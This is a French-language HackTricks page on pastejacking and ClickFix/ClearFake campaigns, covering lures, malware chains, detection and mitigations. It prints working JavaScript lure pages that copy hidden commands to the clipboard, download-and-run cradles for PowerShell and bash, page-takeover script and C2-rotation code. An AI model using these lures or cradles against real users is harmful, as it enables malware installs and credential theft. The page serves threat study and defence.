# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Ne collez jamais quelque chose que vous n’avez pas copié vous-même." – vieux mais toujours valable

## Aperçu

Clipboard hijacking – également connu sous le nom de *pastejacking* – exploite le fait que les utilisateurs copient-colent souvent des commandes sans les vérifier. Une page web malveillante (ou tout contexte capable d'exécuter JavaScript, comme une application Electron ou Desktop) place de façon programmatique du texte contrôlé par l'attaquant dans le clipboard du système. Les victimes sont incitées, généralement par des instructions de social-engineering soigneusement conçues, à appuyer sur **Win + R** (Run dialog), **Win + X** (Quick Access / PowerShell), ou à ouvrir un terminal et à *paste* le contenu du clipboard, exécutant immédiatement des commandes arbitraires.

Parce que **aucun fichier n'est téléchargé et aucune pièce jointe n'est ouverte**, la technique contourne la plupart des contrôles de sécurité des e-mails et du contenu web qui surveillent les pièces jointes, les macros ou l'exécution directe de commandes. L'attaque est donc populaire dans les campagnes de phishing visant à livrer des familles de malware grand public telles que NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## Boutons “Copy” forcés et payloads cachés (macOS one-liners)

Certains infostealers macOS clonent des sites d'installateurs (e.g., Homebrew) et **forcent l'utilisation d'un bouton “Copy”** afin que les utilisateurs ne puissent pas sélectionner uniquement le texte visible. L'entrée du clipboard contient la commande d'installation attendue plus un payload Base64 appendu (e.g., `...; echo <b64> | base64 -d | sh`), ainsi un seul collage exécute les deux étapes pendant que l'interface masque l'étape supplémentaire.

## JavaScript Proof-of-Concept
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Les campagnes plus anciennes utilisaient `document.execCommand('copy')`, les plus récentes s'appuient sur l'asynchrone **Clipboard API** (`navigator.clipboard.writeText`).

## Le flux ClickFix / ClearFake

1. L'utilisateur visite un site typosquatted ou compromis (par ex. `docusign.sa[.]com`)
2. Le JavaScript injecté **ClearFake** appelle un helper `unsecuredCopyToClipboard()` qui stocke silencieusement un one-liner PowerShell encodé en Base64 dans le presse-papiers.
3. Des instructions HTML indiquent à la victime : *“Appuyez sur **Win + R**, collez la commande et appuyez sur Entrée pour résoudre le problème.”*
4. `powershell.exe` s'exécute, téléchargeant une archive contenant un exécutable légitime plus une DLL malveillante (classic DLL sideloading).
5. Le loader décrypte des étapes supplémentaires, injecte du shellcode et installe la persistence (par ex. scheduled task) – exécutant finalement NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemple de chaîne NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart légitime) recherche le fichier `msvcp140.dll` dans son répertoire.
* La DLL malveillante résout dynamiquement les API avec **GetProcAddress**, télécharge deux binaires (`data_3.bin`, `data_4.bin`) via **curl.exe**, les décrypte en utilisant une clé XOR roulante `"https://google.com/"`, injecte le shellcode final et décompresse **client32.exe** (NetSupport RAT) dans `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Télécharge `la.txt` avec **curl.exe**
2. Exécute le JScript downloader dans **cscript.exe**
3. Récupère un payload MSI → dépose `libcef.dll` à côté d'une application signée → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
L'appel **mshta** lance un script PowerShell caché qui récupère `PartyContinued.exe`, extrait `Boat.pst` (CAB), reconstruit `AutoIt3.exe` via `extrac32` et concaténation de fichiers, puis exécute finalement un script `.a3x` qui exfiltre les identifiants du navigateur vers `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Certaines campagnes ClickFix évitent complètement les téléchargements de fichiers et demandent aux victimes de coller un one-liner qui récupère et exécute du JavaScript via WSH, le persiste, et fait tourner le C2 quotidiennement. Exemple de chaîne observée :
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Principales caractéristiques
- Obfuscated URL inversée à runtime pour déjouer les inspections superficielles.
- JavaScript se rend persistant via un Startup LNK (WScript/CScript), et sélectionne le C2 en fonction du jour courant – permettant une domain rotation rapide.

Fragment JS minimal utilisé pour faire tourner les C2s selon la date :
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
La phase suivante déploie souvent un loader qui établit la persistance et récupère un RAT (p. ex. PureHVNC), souvent en pinning TLS sur un certificat codé en dur et en découpant le trafic.

Detection ideas specific to this variant
- Process tree: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (or `cscript.exe`).
- Startup artifacts: LNK in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invoking WScript/CScript with a JS path under `%TEMP%`/`%APPDATA%`.
- Registry/RunMRU and command‑line telemetry containing `.split('').reverse().join('')` or `eval(a.responseText)`.
- Repeated `powershell -NoProfile -NonInteractive -Command -` with large stdin payloads to feed long scripts without long command lines.
- Scheduled Tasks that subsequently execute LOLBins such as `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` under an updater‑looking task/path (e.g., `\GoogleSystem\GoogleUpdater`).

Chasse aux menaces
- Daily‑rotating C2 hostnames and URLs with `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>` pattern.
- Corréler les événements d'écriture du presse-papiers suivis d'un collage Win+R puis d'une exécution immédiate de `powershell.exe`.

Les blue-teams peuvent combiner la télémétrie du presse-papiers, de création de processus et du registre pour identifier les abus de pastejacking :

* Windows Registry: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` garde l'historique des commandes **Win + R** – rechercher des entrées Base64 / obfusquées inhabituelles.
* Security Event ID **4688** (Process Creation) où `ParentImage` == `explorer.exe` et `NewProcessName` dans { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** pour les créations de fichiers sous `%LocalAppData%\Microsoft\Windows\WinX\` ou dans les dossiers temporaires juste avant l'événement 4688 suspect.
* Capteurs EDR du presse-papiers (si présents) – corréler `Clipboard Write` suivi immédiatement d'un nouveau processus PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Des campagnes récentes produisent en masse de fausses pages de vérification CDN/browser ("Just a moment…", IUAM-style) qui forcent les utilisateurs à copier des commandes spécifiques à leur OS depuis le presse-papiers vers des consoles natives. Cela permet d'exfiltrer l'exécution hors du sandbox du navigateur et fonctionne sur Windows et macOS.

Caractéristiques clés des pages générées par le générateur
- Détection de l'OS via `navigator.userAgent` pour adapter les payloads (Windows PowerShell/CMD vs. macOS Terminal). Décoys/no-ops optionnels pour les OS non supportés afin de maintenir l'illusion.
- Copie automatique dans le presse-papiers lors d'actions UI bénignes (checkbox/Copy) alors que le texte visible peut différer du contenu du presse-papiers.
- Blocage des mobiles et un popover avec instructions pas‑à‑pas : Windows → Win+R → coller → Enter ; macOS → ouvrir Terminal → coller → Enter.
- Obfuscation optionnelle et injecteur monofichier pour écraser le DOM d'un site compromis avec une interface de vérification stylée Tailwind (pas besoin d'enregistrer un nouveau domaine).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence of the initial run
- Utilisez `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` pour que l'exécution continue après la fermeture du terminal, réduisant les artefacts visibles.

In-place page takeover on compromised sites
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detection & hunting ideas specific to IUAM-style lures
- Web : Pages qui lient Clipboard API à des widgets de vérification ; incohérence entre le texte affiché et le clipboard payload ; `navigator.userAgent` branching ; Tailwind + single-page replace dans des contextes suspects.
- Windows endpoint : `explorer.exe` → `powershell.exe`/`cmd.exe` peu après une interaction avec le navigateur ; installateurs batch/MSI exécutés depuis `%TEMP%`.
- macOS endpoint : Terminal/iTerm lançant `bash`/`curl`/`base64 -d` avec `nohup` à proximité d'événements navigateur ; tâches en arrière-plan survivant à la fermeture du terminal.
- Corréler l'historique `RunMRU` Win+R et les écritures clipboard avec la création ultérieure de processus console.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## 2026 évolutions des faux CAPTCHA / ClickFix (ClearFake, Scarlet Goldfinch)

- ClearFake continue de compromettre des sites WordPress et d'injecter un loader JavaScript qui enchaîne des hôtes externes (Cloudflare Workers, GitHub/jsDelivr) et même des appels “etherhiding” blockchain (e.g., POSTs to Binance Smart Chain API endpoints such as `bsc-testnet.drpc[.]org`) pour récupérer la logique actuelle du leurre. Les overlays récents utilisent massivement de faux CAPTCHA qui demandent aux utilisateurs de copier/coller un one-liner (T1204.004) au lieu de télécharger quoi que ce soit.
- L'exécution initiale est de plus en plus déléguée à signed script hosts/LOLBAS. Les chaînes de janvier 2026 ont remplacé l'usage antérieur de `mshta` par le built-in `SyncAppvPublishingServer.vbs` exécuté via `WScript.exe`, passant des arguments PowerShell-like avec aliases/wildcards pour récupérer du contenu distant :
```cmd
"C:\WINDOWS\System32\WScript.exe" "C:\WINDOWS\system32\SyncAppvPublishingServer.vbs" "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/grading-chatter-dock73/vigilant-bucket-gui/p1lot')"
```
- `SyncAppvPublishingServer.vbs` est signé et normalement utilisé par App-V ; associé à `WScript.exe` et à des arguments inhabituels (`gal`/`gcm` aliases, wildcarded cmdlets, jsDelivr URLs) il devient une étape LOLBAS à fort signal pour ClearFake.
- En février 2026, les payloads de CAPTCHA factices sont revenus à de purs PowerShell download cradles. Deux exemples en direct :
```powershell
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -c iex(irm 158.94.209[.]33 -UseBasicParsing)
"C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -w h -c "$w=New-Object -ComObject WinHttp.WinHttpRequest.5.1;$w.Open('GET','https[:]//cdn[.]jsdelivr[.]net/gh/www1day7/msdn/fase32',0);$w.Send();$f=$env:TEMP+'\FVL.ps1';$w.ResponseText>$f;powershell -w h -ep bypass -f $f"
```
- La première chaîne est un grabber en mémoire `iex(irm ...)` ; la seconde passe par `WinHttp.WinHttpRequest.5.1`, écrit un fichier temporaire `.ps1`, puis le lance avec `-ep bypass` dans une fenêtre cachée.

Conseils de détection/chasse pour ces variantes
- Lignée des processus : navigateur → `explorer.exe` → `wscript.exe ...SyncAppvPublishingServer.vbs` ou PowerShell cradles immédiatement après des écritures dans le presse-papiers/Win+R.
- Mots-clés de ligne de commande : `SyncAppvPublishingServer.vbs`, `WinHttp.WinHttpRequest.5.1`, `-UseBasicParsing`, `%TEMP%\FVL.ps1`, domaines jsDelivr/GitHub/Cloudflare Worker, ou motifs `iex(irm ...)` pointant vers une IP directe.
- Réseau : connexions sortantes vers des hôtes CDN worker ou des endpoints RPC blockchain depuis des hôtes script/PowerShell peu de temps après la navigation web.
- Fichier/registre : création temporaire de `.ps1` sous `%TEMP%` ainsi que des entrées RunMRU contenant ces one-liners ; bloquer/alerter sur des signed-script LOLBAS (WScript/cscript/mshta) exécutant des URLs externes ou des alias obfusqués.

## Mitigations

1. Renforcement du navigateur – désactiver l'accès en écriture au presse-papiers (`dom.events.asyncClipboard.clipboardItem` etc.) ou exiger un geste utilisateur.
2. Sensibilisation à la sécurité – apprendre aux utilisateurs à *taper* les commandes sensibles ou à coller d'abord dans un éditeur de texte.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control pour bloquer les one-liners arbitraires.
4. Contrôles réseau – bloquer les connexions sortantes vers des domaines connus de pastejacking et de malware C2.

## Related Tricks

* **Discord Invite Hijacking** utilise souvent la même approche ClickFix après avoir attiré les utilisateurs dans un serveur malveillant :

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)
- [2025, the year of the Infostealer](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [Red Canary – Intelligence Insights: February 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-february-2026/)

{{#include ../../banners/hacktricks-training.md}}
